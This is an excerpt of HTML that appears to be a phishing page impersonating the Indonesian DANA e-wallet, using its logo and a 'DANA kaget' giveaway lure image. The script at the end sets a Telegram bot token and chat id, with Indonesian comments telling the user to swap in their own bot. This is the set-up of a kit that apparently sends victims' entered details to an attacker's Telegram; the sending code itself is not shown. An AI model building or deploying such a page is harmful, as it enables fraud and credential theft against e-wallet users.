...
<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPSzs4SMiZujy_oPUBNoYohH0BiG5gFJndxAFfgLoRhnABt7LFgYcp7Ku1XddHGvftn-1G0LmVLg1QOA2g8EuAHkYedx1XedonRqrzlGjZQG7StMOQf3lcm8HxK73AdvpjHJ1YcHhEaF595hdPKG98ZezmYTIB6e036aQYgQEXOBePCst9iuRDyIRhUao/s1080/AddText_11-16-05.41.15.png">
...
<img src="https://www.dana.id/_nuxt/img/dana-logo.fe46647.png" style="width: 100px; margin-top: 7px; margin-left: 9px; background: #">   
</nav>
<center>
 <img id="video"
  ...
  box-shadow: rgba(6, 24, 44, 1.4) 0px 0px 6px 6px, rgba(6, 24, 44, 0.05) 0px 4px 6px -1px, rgba(255, 255, 255, 1.08) 0px 1px 0px inset; outline: 3px solid #118EEA" preload="metadata" src="https://gallery.poskota.co.id/storage/Foto/dana-kaget-dana.jpg" type="img/jpeg" class="animated">
</center>
<section class="effec">
<!-- partial:index.partial.html -->
...
<script>
   ...
   var token = '7407517840:AAF5lDxFUF1pog6ATzzK6SQsEst13uTaysA'; // Ganti dengan token bot yang kamu buat
    var grup = '6804994650'; // Ganti dengan chat id dari bot yang kamu buat
